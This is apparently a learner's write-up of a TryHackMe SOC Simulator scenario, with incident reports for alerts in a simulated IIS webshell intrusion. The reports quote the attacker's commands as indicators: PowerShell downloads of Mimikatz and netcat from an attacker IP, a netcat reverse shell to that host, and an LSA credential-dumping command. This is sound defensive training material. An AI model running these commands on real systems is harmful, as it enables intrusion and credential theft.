<h1 align="center">SOC Simulator &nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;&nbsp; <a href="https://tryhackme.com/soc-sim/scenarios?scenario=hidden-hooks"> Hidden Hooks</a></h1>
<p align="center"><img width="590px" src="https://github.com/user-attachments/assets/dead2c02-dcce-4b2b-86a8-3e704ca317e4"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2022-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Overview](#1) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Objectives](#2) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Methodology](#3) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Documentation](#4)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Practice](#5)


<br>
<br>
<h2>Overview<a id='1'></a></h2>
<p>After years of meticulous development, <code>TryHatMe Studios</code> is on the cusp of releasing its highly anticipated product. That is, before an up-and-coming underground hacker group disrupt their plans..</p>

<br>
<br>
<h2>Objectives<a id='2'></a></h2>
<p>

- Familiarise yourself with TryHatMe Studios using the documentation.<br>
- Determine and escalate true positives, writing a case report for each alert.<br>
- Investigate how the IIS server was used in the attack.<br>
- Discover how the attacker escalated their privileges on the domain.<br>
- See what the attackers leaked.</p>

<br>
<br>
<h2>Methodology<a id='3'></a></h2>
<p>
  
- Step 1<br><strong>Find all the true positives</strong><br>To complete a Scenario, find all the True Positive alerts. Keep triaging alerts until you've closed them all!<br><br>
- Step 2<br><strong>Read the documentation</strong><br>Before diving into the triage, take a moment to review the provided documentation. This will give you essential context and strategies for investigation.<br><br>
- Step 3<br><strong>Investigate the alert queuE</strong><br>Your journey starts in the alert queue. Investigate each alert, and prioritise what seems most critical. Understanding the types of alerts can help you manage your time effectively.<br><br>
- Step 4<br><strong>Take ownership of an alert</strong><br>Click on an alert to take ownership. This action starts the timer for MTTR, so act fast! Use this to strategise how you spend time on each alert.<br><br>
- Step 5<br><strong>Deep dive with the SIEM & VM</strong><br>Use the SIEM to search logs and investigate indicators. The VM is there for deeper analysis. Combine these tools to verify what’s real and what’s a false alarm.<br><br>
- Step 6<br><strong>Write your findings as a report</strong><br>For each alert, determine whether it's a true positive or a false positive. Clearly document your findings, analysis, and actions taken. Submit the report when you're confident in your conclusions—accurate and well-written reports will earn you more points!<br><br>
- Step 7<br><strong>Analyse your performance</strong><br>After completing the scenario, dive into your wrap-up report to see how you performed. You’ll receive detailed feedback on your MTTR, points scored, the number of closed alerts, and personalised AI insights to enhance your future reporting.</p>

<br>
<br>
<br>
<h2>Documentation<a id='4'></a></h2>

```bash
Documentation

Employees:

Michael Ascot - m.ascot@tryhatmestudios.thm - Lead Developer
Michelle Smith - m.smith@tryhatmestudios.thm - Head of Marketing
Luke Sullivan - l.sullivan@tryhatmestudios.thm - IT Service Delivery
Devices:

thm-ad-servies - 172.16.1.10
thm-wks-01 - 172.16.1.100
thm-wks-02 - 172.16.1.101
```

<br>
<h2>Practice<a id='5'></a></h2>
<h3>Alerts´s Summary</h3>

<div align="left"><h6>

|ID<br><br><br>|Severity<br><br><br>|Alert rule<br><br><br>                    |Type<br><br><br>        |Classification<br><br><br>       |Score<br><br><code>345</code>|Value<br><br><code>400</code>|
|:----|:--------|:------------------------------------|:---------------|:----------------------------|----:|----:|
|3001 |Low       |Web Server Bruteforcing             |Enumeration            | True Positive | 40 | 40 |
|3002 |High      |Potential WebShell Accessed         |WebShell               | True Positive | 30 | 30 |
|3003 |Medium    |PowerShell Execution                |Execution              | True Positive | 35 | 35 |
|3005 |Medium    |Network: File Download              |Network Activity       | True Positive | 40 | 40 |
|3006 |Critical  |Reverse Shell                       |Network Activity       | True Positive | 35 | 35 |
|3007 |Medium    |PowerShell Execution                |Execution              | True Positive | 35 | 35 |
|3008 |Medium    |Network: File Download              |Network Activity       | True Positive | 40 | 40 |
|3010 |Critical  |Mimikatz                            |Credential Dumping     | True Positive | 35 | 35 |
|3011 |High      |Kerberos                            |Network Authentication | True Positive | 35 | 35 |
|3012 |High      |Successful Authentication           |Network Authentication | True Positive | 35 | 35 |
|3009 |Low       |Network: Suspicious Activity        |Network Activity       | False Positive| 10 | 10 |
|3004 |Low       |Executable Launch                   |Application Launch     | False Positive| 10 | 10|
|     |          |                                    |                       |               | -  | 20|

</h6></div>

<br>
<h1>Reports</h1>

<h1>3010 |Mimikatz | Critical | Credential Dumping</h1>


```bash
Time of activity: 
-  01/22/2026 22:12:36.325

List of Affected Entities: 
-  UserName: NT AUTHORITY\SYSTEM
-  Computer: thm-services.tryhatme.local
-  UserId: S-1-5-18

Reason for Classifying as True Positive: 
-  This is a confirmed True Positive. Splunk logs show that at 01/22/2026 22:10:21.325, the attacker used PowerShell (Invoke-WebRequest) to download mimikatz.exe from the C2 server (42.86.146.137). Two minutes later, at 01/22/2026 22:12:36.325, the alert triggered when the file was executed with the command lsadump::lsa /inject /id:500, which is a known command for dumping LSA secrets and credentials.

Reason for Escalating the Alert: 
-  The attacker has achieved execution as NT AUTHORITY\SYSTEM and is actively dumping credentials (Credential Dumping). This compromises the entire confidentiality of the domain and allows for immediate lateral movement or persistence (Golden Ticket attacks).

Recommended Remediation Actions: 
-  Immediate Isolation: Disconnect thm-services.tryhatme.local from the network immediately.
-  Process Termination: Kill the parent process cmd.exe (PID 2888) and any running instances of mimikatz.exe.
-  Cleanup: Remove the malicious file C:\windows\system32\inetsrv\mimikatz.exe.
-  Credential Reset: Force a password reset for the Administrator account (ID 500) and any other accounts currently logged into that server, as their hashes have likely been stolen

List of Attack Indicators: 
-  Malicious File Path: C:\windows\system32\inetsrv\mimikatz.exe
-  Malicious Command: lsadump::lsa /inject /id:500
-  Attacker IP (Download Source): 42.86.146.137
-  MapDescription: Process creation
-  EventId: 1
-  EventRecordId: 3871
-  ProcessId: 6560
-  ThreadId: 7932
-  MD5 Hash: E930B05EFE23891D19BC354A4209BE3E
-  SHA256: 92804FAAAB2175DC501D73E814663058C78C0A042675A8937266357BCFB96C50
-  IMPHASH: 1355327F6CA3430B3DDBE6E0ACDA71EA
-  ParentProcess: C:\Windows\System32\cmd.exe
-  ParentProcessID: 2888
-  ParentCommandLine: "c:\windows\system32\cmd.exe" /c C:\windows\system32\inetsrv\mimikatz.exe "lsadump::lsa /inject /id:500"
-  datasource: Microsoft-Windows-Sysmon/Operational
-  ProcessGUID: fa013483-edca-67a0-3d07-000000000400
```

<h1>3012 | Successful Authentication | High | Network Authentication</h1>

```bash
Time of activity: 
-  01/22/2026 22:14:51.325

List of Affected Entities: 
-  UserName: TRYHATME\tryhatme
-  Computer: thm-services.tryhatme.local

Reason for Classifying as True Positive: 
-  A Kerberos authentication ticket (TGT) was granted on  01/22/2026 22:14:36.325 (Event Record Id: 25832 & PID 676) for the remote host 42.86.146.137.
-  In sequence the atatcker authenticated successfully from remote hote RSKE-WS (42.86.146.137), EventRecordID 31218, EventID 4624 as user TRYHATME\tryhatme.

Reason for Escalating the Alert: 
-  Confirmed that there was a successful authentication.

Recommended Remediation Actions: 
-  Isolate & Contain: Immediately disconnect thm-services.tryhatme.local from the network to prevent the attacker from using the stolen credentials to move laterally to other servers or Domain Controllers.
-  Credential Reset (Critical): Immediately reset the password for the built-in Administrator account (RID 500) and the krbtgt account (twice) if the compromised host is a Domain Controller, to invalidate any potential Golden Tickets. Force a password reset for all accounts that were logged into this machine.
-  Threat Eradication: Terminate the malicious processes associated with the attack (PID 6560, PID 2888) and delete the artifacts mimikatz.exe, nc64.exe, and shell.aspx from C:\windows\system32\inetsrv\.
-  Forensic Analysis: Review the Domain Controller logs for unusual login activity utilizing the compromised Administrator account originating from this host IP.

List of Attack Indicators: 
-  RemoteHost: RSKE-WS (42.86.146.137)
-  MapDescription: Successful logon
-  RecordNumber: 1
-  datasource: Security
-  EventId: 4624
-  EventRecordId: 31218
-  ProcessId: 676
-  ThreadId: 4904
```


<h1>3001 | Web Server BruteForcing | Low | Enumeration</h1>

```bash
Time of activity: 
-   01/22/2026 22:02:11.325

List of Affected Entities: 
- host: tryhatmestudios.thm

Reason for Classifying as True Positive: 
- Confirmed automated directory brute-forcing attack. The logs show a rapid burst of 14 GET requests targeting non-existent or sensitive directories (e.g., /wp-admin, /backup, /tomcat) resulting in 404 errors. This pattern indicates the use of an automated vulnerability scanner or directory enumeration tool (like Gobuster or Dirb) to map the server's structure.

Reason for Escalating the Alert: 
- Successful Enumeration leading to Compromise. While most requests failed, the scanner successfully located a writable path, followed immediately by a successful POST request (Status 200) to /uploads/shell.aspx. This indicates the reconnaissance phase was successful and transitioned directly into an exploitation phase.

Recommended Remediation Actions: 
- Block: Immediately blacklist IP 42.86.146.137 at the firewall level. - Investigate: Review web logs to confirm if any other files were accessed or uploaded during the scan. - Hardening: Implement rate limiting on the web server to prevent rapid-fire requests from scanners.

List of Attack Indicators: 
- Attacker IP: 42.86.146.137 - Tool Signature: High-frequency requests indicative of automated scanning. - Target: tryhatmestudios.thm - Transition Event: POST request to /uploads/shell.aspx following the scan.
```

<h1>3007 | PowerShell Execution | Medium | Execution</h1>


```bash
Time of activity: 
-  01/22/2026 22:09:21.325

List of Affected Entities: 
-  User: NT AUTHORITY\SYSTEM
-  Computer: thm-services.tryhatme.local
-  Target Service: Active Directory (UserId: S-1-5-15)

Reason for Classifying as True Positive: 
- Confirmed Domain Reconnaissance. The compromised web server (w3wp.exe) executed PowerShell to run "Get-ADUser -Filter *". This is a True Positive indicating the attacker is pivoting from the local machine context to the broader Network/Domain context. They are enumerating all user accounts in the Active Directory to identify high-value targets (like Domain Admins).

Reason for Escalating the Alert: 
- Lateral Movement Preparation. This activity signifies the attacker is no longer focused just on the web server but is preparing to attack the entire domain infrastructure.

Recommended Remediation Actions: 
-  Isolate: Disconnect the host to prevent it from sending queries to the Domain Controller. 
-  Alert: Notify AD Admins of potential enumeration activity. 
-  Reset: Force password resets for sensitive accounts that may have been targeted.

List of Attack Indicators: 
-  ExecutableInfo: "powershell.exe" -noninteractive -executionpolicy bypass Get-ADUser -Filter *
-  MapDescription: Process creation
-  Technique: Account Discovery (Domain)
-  Pivot Point: thm-services.tryhatme.local querying the DC
-  ProcessGUID: fa013483-e8ac-67a0-f706-000000000400
-  RecordNumber: 1
-  MD5: 7353F60B1739074EB17C5F4DDDEFE239
-  SHA256: DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C
-  IMPHASH: 741776AACCFC5B71FF59832DCDCACE0F
-  ParentProcess: C:\Windows\System32\inetsrv\w3wp.exe
-  ParentProcessID: 6536
-  ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm2a8892a7-0664-4175-8b1b-8c9d1aaf942a -h "C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config" -w "" -m 0 -t 20 -ta 0
-  datasource: Microsoft-Windows-Sysmon/Operational
```

<h1>3003 | PowerShell Execution | Medium | Execution</h1>

```
Time of activity: 
- 01/22/2026 22:04:21.325

List of Affected Entities: 
- Computer: thm-services.tryhatme.local
- User: NT AUTHORITY\SYSTEM

Reason for Classifying as True Positive: 
- Confirmed malicious execution. The IIS process (w3wp.exe) executed "powershell.exe -noninteractive -executionpolicy bypass dir". This is a True Positive because legitimate web server processes do not typically spawn shells to list directory contents. This indicates the attacker is manually verifying their location and file system visibility immediately after compromising the server.

Reason for Escalating the Alert: 
- Post-Exploitation Discovery. The attacker has stabilized access and is performing local system reconnaissance on the production server "thm-services". This is a precursor to downloading further tools or moving laterally.

Recommended Remediation Actions: 
- Isolate: Quarantine the server thm-services.tryhatme.local. 
- Terminate: Kill the parent process w3wp.exe and the child powershell.exe instance (PID 6560).
- Audit: Check command history to see if other discovery commands (like whoami or net user) were run.

List of Attack Indicators: 
- Command: "powershell.exe" ... dir 
- Technique: File and Directory Discovery (T1083) 
- Context: Post-compromise reconnaissance via Web Shell.
```

<h1>3002 | Potential WebShell Accessed | High | WebShell</h1>


```bash
Time of activity: 
-  01/22/2026 22:02:51.325

List of Affected Entities: 
- Computer: thm-services.tryhatme.local
- User: NT AUTHORITY\SYSTEM

Reason for Classifying as True Positive: 
- Analysis confirms a Web Shell attack. IIS logs reveal a successful HTTP POST request to "/uploads/shell.aspx" from external IP 42.86.146.137. Immediately following this request, the IIS worker process (w3wp.exe) spawned a child PowerShell process. This causality chain confirms that the web shell "shell.aspx" was used to execute commands on the server.

Reason for Escalating the Alert: 
- Confirmed Remote Code Execution (RCE). The attacker is successfully executing commands as "NT AUTHORITY\SYSTEM" via the web shell. This allows full control over the web server application and serves as a beachhead for further attacks.

Recommended Remediation Actions: 
- Eradication: Delete the malicious file C:\inetpub\wwwroot\uploads\shell.aspx.
- Containment: Isolate the host from the network to stop C2 communication.
- Block: Create a firewall rule for IP 42.86.146.137.

List of Attack Indicators:
File: /uploads/shell.aspx
cs_method: POST
cs_uri_stem: tryhatmestudios.thm/uploads/shell.aspx
sc_status: 200
time_taken: 130
datasource: Microsoft-Windows-IIS
```

<h1>3006 | Reverse Shell | Critical | Network Activity</h1>


```bash
Time of activity: 
-  01/22/2026 22:08:51.325

List of Affected Entities: 
-  UserName: NT AUTHORITY\SYSTEM
-  Computer: thm-services.tryhatme.local
-  UserId: S-1-5-15

Reason for Classifying as True Positive: 
-  The attacker (IP 42.86.146.137) started using PowerShell just after the successfull POST request of shell.aspx, through PPID 6536 & PPID 6560 "C:\Windows\System32\inetsrv\w3wp.exe" on 01/22/2026 22:04:21.325.
-  The attacker  downloaded "KeePass.exe" (PDI 11048), "nc64.exe" (PID 8492), "mimikatz.exe" (PID 3536), next performinf a DNS Query on 01/18/2026 22:23:36.795 and the enumeration of the company´s users through "C:\windows\system32\inetsrv\mimikatz.exe "lsadump::lsa /inject /id:500" ", leading to a successful logon on 01/22/2026 22:14:51.325 (PID 676).

Reason for Escalating the Alert: 
-  The alert confirms a Critical Severity incident involving full system compromise..
-  The attacker  (IP 42.86.146.137) has leveraged the initial web shell access to execute arbitrary commands with "NT AUTHORITY\SYSTEM"  privileges through IIS worker process (w3wp.exe).
-  The activity includes the download of offensive tools like "Netcat" (nc64.exe), "MiMikatz", "KeePass", as well as the successfull execution of a Reverse Shell using nc64.exe and establishing a Command and Control channel. 
-  The attacker executed "Mimikatz" to dumpl LSA secrets via "lsadump::lsa" and there is the indication of successfull login.

Recommended Remediation Actions: 
-  Immediate Containment: Isolate the compromised host from the network immediately to sever the C2 channel (Netcat connection to 42.86.146.137) and prevent lateral movement.
-  Process Termination: Manually terminate the malicious processes, specifically the Netcat reverse shell (PID 8492), Mimikatz (PID 3536), and the parent PowerShell instance spawned by w3wp.exe.
-  Credential Rotation: Immediately reset the password for the built-in Administrator account (ID 500) and force a password reset for all users, as credential dumping (LSA secrets) was successfully performed.
-  Eradication: Delete the malicious binaries downloaded to C:\Windows\System32\inetsrv\ (nc64.exe, mimikatz.exe, KeePass.exe) and the initial web shell (shell.aspx).
Forensic Investigation: Review logs for any other accounts created or modified by the attacker while they had SYSTEM access.

List of Attack Indicators: 
-  ExecutableInfo: c:\windows\system32\inetsrv\nc64.exe "42.86.146.137 4444 -e cmd.exe"
-  MapDescription: Process creation
-  ParentProcess: C:\Windows\System32\cmd.exe
-  ParentProcessID: 2888
-  ParentCommandLine: "c:\windows\system32\cmd.exe" /c C:\windows\system32\inetsrv\nc64.exe "42.86.146.137 4444 -e cmd.exe"
-  ProcessGUID: fa013483-8329-67bf-5c03-000000000900
-  RecordNumber: 1
-  MD5: 523613A7B9DFA398CBD5EBD2DD0F4F38
-  SHA256: 3E59379F585EBF0BECB6B4E06D0FBBF806DE28A4BB256E837B4555F1B4245571
-  IMPHASH: 567531F08180AB3963B70889578118A3
-  ParentProcess: C:\Windows\System32\cmd.exe
-  ParentProcessID: 2888
-  ParentCommandLine: "c:\windows\system32\cmd.exe" /c C:\windows\system32\inetsrv\nc64.exe "42.86.146.137 4444 -e cmd.exe"
-  datasource: Microsoft-Windows-Sysmon/Operational
-  EventId: 1
-  EventRecordId: 3871
-  ProcessId: 8492
-  ThreadId: 7916
```


<h1>3008 | Network: File Download | Medium | Network Activity</h1>

```bash
Time of activity: 
-  01/22/2026 22:10:21.325

List of Affected Entities: 
-  Computer: thm-services.tryhatme.loca
-  User: NT AUTHORITY\SYSTEM

Reason for Classifying as True Positive: 
-  Confirmed download of known offensive tool. The attacker used PowerShell (Invoke-WebRequest) to download "mimikatz.exe"  from the C2 server 42.86.146.137.
-  Mimikatz is a critical tool used for Credential Dumping (extracting plaintext passwords/hashes from memory). 

Reason for Escalating the Alert: 
- Confirmed the download of a offensice tool (mimikatz.exe) which indicated that the attacker might be in the Weaponization Phase,  equipping the compromised server with a tool to escalate privileges (Mimikatz).   The presence of Mimikatz specifically indicates an intent to steal domain credentials.

Recommended Remediation Actions: 
-  Eradication: Delete C:\windows\system32\inetsrv\mimikatz.exe. 
-  Block: Block all outbound traffic to 42.86.146.137.
-  Reset: Assume credentials are compromised; reset Admin passwords immediately.

List of Attack Indicators: 
-  File/ Tool: mimikatz.exe
-  Method:  PowerShell Invoke-WebRequest
-  ExecutableInfo: "powershell.exe" -noninteractive -executionpolicy bypass Invoke-WebRequest 'http://42.86.146.137:8000/mimikatz.exe' -OutFile 'C:\windows\system32\inetsrv\mimikatz.exe'
-  MapDescription: Process creation
-  EventRecordId: 3860
-  ProcessId: 6560
-  ThreadId: 7932
-  RecordNumber: 1
-  MD5: 7353F60B1739074EB17C5F4DDDEFE239
-  SHA256: DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C
-  IMPHASH: 741776AACCFC5B71FF59832DCDCACE0F
-  ParentProcess: C:\Windows\System32\inetsrv\w3wp.exe
-  ParentProcessID: 6536
-  ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm2a8892a7-0664-4175-8b1b-8c9d1aaf942a -h "C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config" -w "" -m 0 -t 20 -ta 0
-  datasource: Microsoft-Windows-Sysmon/Operational
-  timestamp: 01/22/2026 22:10:21.325
-  ProcessGUID: fa013483-eca7-67a0-3307-00000000040
```

<h1>3005 | Network: File Download | Medium | Network Activity</h1>


```bash
Time of activity: 
- 01/22/2026 22:06:51.325

List of Affected Entities: 
-  Computer: thm-services.tryhatme.local
-  UserName: NT AUTHORITY\SYSTEM
-  UserId: S-1-5-15

Reason for Classifying as True Positive: 
-  On 01/22/2026 22:06:51.325 the attacker (42.86.146.137) downloaded NetCat (nc64.exe) triggered by PPID 6536  "w3wp.exe",  saving it on the path "C:\windows\system32\inetsrv\nc64.exe" of  the computer  "thm-services.tryhatme.local".

Reason for Escalating the Alert: 
-  Confirmed that the suspicious nc64.exe was downloaded from 42.86.146.137 to thm-services.tryhatme.local.

Recommended Remediation Actions: 
-  Containment: Immediately isolate the affected computer ( thm-services.tryhatme.local) from the network to prevent lateral movement.
-  Block: Implement a firewall rule to block traffic from the malicious source IP 42.86.146.137.
-  Eradication: Locate and securely remove the malicious file "nc64.exe".
-  Investigation: Analyze web server logs to determine the mechanism of the files upload.

List of Attack Indicators: 
-  ExecutableInfo: "powershell.exe" -noninteractive -executionpolicy bypass Invoke-WebRequest 'http://42.86.146.137:8000/nc64.exe' -OutFile 'C:\windows\system32\inetsrv\nc64.exe'
-  MapDescription: Process creation
-  EventId: 1
-  EventRecordId: 3860
-  ProcessId: 6560
-  ThreadId: 7932
-  RecordNumber: 1
-  MD5: 7353F60B1739074EB17C5F4DDDEFE239
-  SHA256: DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C
-  IMPHASH: 741776AACCFC5B71FF59832DCDCACE0F
-  ParentProcess: C:\Windows\System32\inetsrv\w3wp.exe
-  ParentProcessID: 6536
-  ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm2a8892a7-0664-4175-8b1b-8c9d1aaf942a -h "C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config" -w "" -m 0 -t 20 -ta 0
-  datasource: Microsoft-Windows-Sysmon/Operational
-  ProcessGUID: fa013483-eca7-67a0-3307-000000000400
```

<h1>3011 | Kerberos | High | Network Authentication</h1>


```bash
Time of activity: 
-  01/22/2026 22:14:36.325

List of Affected Entities: 
-  Computer: thm-services.tryhatme.local
-  Authentication Service: Kerberos (Ticket Granting Ticket - TGT)

Reason for Classifying as True Positive: 
-  Confirmed Pass-the-Hash / Overpass-the-Hash attack. Two minutes after executing Mimikatz to dump credentials (Alert 3010 at 22:12:36), the attacker successfully requested and received a Kerberos TGT (PID 676) originating from the external malicious IP 42.86.146.137. This confirms the attacker is using the stolen credentials to authenticate legitimately against the domain

Reason for Escalating the Alert: 
- The attacker has transitioned from "Remote Code Execution" to "Valid Credential Access". By obtaining a valid TGT, they can now access other domain resources without needing to exploit further vulnerabilities, effectively persisting in the network.

Recommended Remediation Actions: 
- Immediate Password Reset (KRBTGT): Since a TGT was likely forged or obtained via compromised hashes, reset the krbtgt account password (twice) to invalidate all existing tickets.
-  Isolate: Disconnect thm-services.tryhatme.local.
-  Block: Ensure IP 42.86.146.137 is blocked at the perimeter.
-  Account Reset: Reset passwords for any accounts (likely Administrator) whose hashes were exposed.


List of Attack Indicators: 
-  RemoteHost: 42.86.146.137
-  MapDescription: A Kerberos authentication ticket (TGT) was granted
-  EventId: 673
-  EventRecordId: 25832
-  ProcessId: 676
-  ThreadId: 7720
-  RecordNumber: 1
-  datasource: Security
```


<h1>3009 | Network: Suspicious Activity | Low | Network Activity</h1>


```bash
Time of Activity: 
-   01/22/2026 22:11:21.325

List of Related Entities: 
-  User:          TRYHATME\l.sullivan
-  Host:          thm-wks-01.tryhatme.loca
-  Process:    C:\Program Files\Mozilla Firefox\firefox.exe

23.215.0.132;96.7.128.192;23.215.0.133;96.7.128.186;

Reason for Classifying as False Positive:  
- User l.sullivan used  "firefox.exe" on 01/22/2026 22:11:21.325 to access legitimate websites related to "Akamai Technologies, Inc. (AKAMAI)" through:
----- IP 23.215.0.132   ((AKAMAI                      -    https://rdap.arin.net/registry/entity/AKAMAI)
----- IP 96.7.128.192   (AKAMAI-200703      -    https://rdap.arin.net/registry/ip/96.6.0.0)
-----  IP 23.215.0.133  (AKAMAI                       -    https://rdap.arin.net/registry/ip/23.192.0.0)
-----  IP 96.7.128.186   (AKAMAI-200703     -    https://rdap.arin.net/registry/ip/96.6.0.0)
```


<h1>3004 | Executable Launch | Low | Application Launch</h1>

```bash
Time of Activity: 
- 01/22/2026 22:05:41.325

List of Related Entities: 
-  UserName: TRYHATME\l.sullivan
-  Computer: thm-wks-01.tryhatme.local

Reason for Classifying as False Positive: 
-  This alert indicates benign user activity. 
-  The application KeePass.exe is a legitimate password manager running from its standard installation path (C:\Program Files\KeePass Password Safe 2\). The parent process is C:\Windows\explorer.exe (PID 4776), which confirms that the user TRYHATME\l.sullivan manually launched the application via the GUI/Desktop on the workstation thm-wks-01. 
-  There are no malicious arguments or indicators connecting this activity to the compromise observed on the thm-services server.
```


<br>
<br>
<br>

```bash
* powershell
| table timestamp, ProcessId, ParentProcessID, UserName, UserId, Computer, EventRecordId, MapDescription,  Image, ExecutableInfo, ParentProcess, ParentCommandLine
| sort by +_timestamp
```


<img width="1905" height="831" alt="image" src="https://github.com/user-attachments/assets/d3a28e20-f7a7-47bf-a599-c8ff0d5d3689" />

<br>
<br>
<br>

<img width="1894" height="692" alt="image" src="https://github.com/user-attachments/assets/c6dc189a-f451-48c2-9395-25a4104285d8" />

<br>
<br>
<br>

```bash
*
| table timestamp, c_ip, cs_method, cs_uri_stem, cs_uri_query, sc_status
| sort by +_timestamp
```

<img width="1891" height="697" alt="image" src="https://github.com/user-attachments/assets/c857905a-cdfa-45fc-a22c-dd5c58b06e42" />


<br>
<br>
<br>

<img width="1909" height="883" alt="image" src="https://github.com/user-attachments/assets/7ca10e0f-401f-4d36-95b8-65d99011dd0f" />


<br>
<br>
<br>


<img width="1901" height="649" alt="image" src="https://github.com/user-attachments/assets/496f0ae0-8aad-4521-8296-344cdde9895a" />

<br>
<br>
<br>

<h1 align="center">SOC Simulator Scenario Completed</h1>


<p align="center"><img width="700px" src="https://github.com/user-attachments/assets/f4281ea0-867e-4a29-a3f4-9f41e6a0de92"><br>
                  <img width="300px" src="https://github.com/user-attachments/assets/6cfefdaf-9608-467c-a0b0-598480e2555c"></p>


<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|22     |Easy ⚙️ - Hidden Hooks                |21 |     82ⁿᵈ  |     3ʳᵈ    |      189ᵗʰ   |        3ʳᵈ     |    141,059  |    1,071    |    88     |
|22     |Medium 🔗 - ret2libc                  |21 |     82ⁿᵈ  |     3ʳᵈ    |      193ʳᵈ   |        3ʳᵈ     |    140,979  |    1,071    |    88     |
|20     |Easy 🔗 - MS Entra ID: Hybrid Identities|19|    82ⁿᵈ  |     3ʳᵈ    |      184ᵗʰ   |        2ⁿᵈ     |    140,971  |    1,069    |    88     |
|19     |Easy ⚙️ - Upload and Conquer          |18 |     81ˢᵗ  |     3ʳᵈ    |      181ˢᵗ   |        2ⁿᵈ     |    140,859  |    1,068    |    88     |
|18     |Easy 🔗 - MS Entra ID: Identities     |17 |     83ʳᵈ  |     3ʳᵈ    |      341ˢᵗ   |        3ʳᵈ     |    139,864  |    1,068    |    88     |
|18     |Easy ⚙️ - APT28: Initial Access       |17 |     84ᵗʰ  |     3ʳᵈ    |      341ˢᵗ   |        3ʳᵈ     |    139,752  |    1,067    |    88     |
|18     |Easy ⚙️ - Hidden Hooks                |17 |           |     3ʳᵈ    |              |                |             |    1,067    |    88     |
|17     |Easy 🔗 - MS Entra ID: Introduction   |17 |     83ʳᵈ  |     3ʳᵈ    |      359ᵗʰ   |        3ʳᵈ     |    139,657  |    1,067    |    88     |
|17     |Easy ⚙️ - APT28: Credential Access    |17 |           |     3ʳᵈ    |              |                |             |    1,067    |    88     |
|17     |Medium ⚙️ - Open Door                 |17 |           |     3ʳᵈ    |              |                |             |     1,067   |    88     |
|17     |Easy 🔗 - Offensive Security Intro    |16 |     87ᵗʰ  |     3ʳᵈ    |      504ᵗʰ   |        5ᵗʰ     |    139,099  |    1,067    |    88     |
|16     |Hard 🚩 - Spring                      |15 |     87ᵗʰ  |     3ʳᵈ    |      540ᵗʰ   |        4ᵗʰ     |    138,942  |    1,066    |    87     |
|14     |Insane 🚩 - Scheme Catcher            |13 |     87ᵗʰ  |     3ʳᵈ    |      534ᵗʰ   |        5ᵗʰ     |    138,822  |    1,065    |    87     |
|13     |Hard 🚩 - Breachblocker Unlocker      |12 |     86ᵗʰ  |     3ʳᵈ    |      526ᵗʰ   |        5ᵗʰ     |    138,732  |    1,064    |    87     |
|11     |Medium 🚩 - Azure: Eyes Wide Shut     |10 |     86ᵗʰ  |     3ʳᵈ    |      558ᵗʰ   |        5ᵗʰ     |    138,450  |    1,063    |    86     |
|8      |Medium ⚙️ - Phishing Unfolding        | 7 |     86ᵗʰ  |     3ʳᵈ    |      508ᵗʰ   |        4ᵗʰ     |    138,372  |    1,062    |    84     |
|8      |Easy ⚙️ - Introduction to Phishing    | 7 |     96ᵗʰ  |     3ʳᵈ    |    2,479ᵗʰ   |       32ⁿᵈ     |    137,117  |    1,062    |    84     |
|8      |Medium 🔗 - KaffeeSec - SoMeSINT      | 7 |     98ᵗʰ  |     3ʳᵈ    |    2,847ᵗʰ   |       38ᵗʰ     |    137,052  |    1,062    |    84     |
|7      |Hard 🚩 - Hack Back                   | 6 |     98ᵗʰ  |     3ʳᵈ    |    2,798ᵗʰ   |       37ᵗʰ     |    136,908  |    1,061    |    84     |
|7      |Hard 🚩 - Dead End?                   | 6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
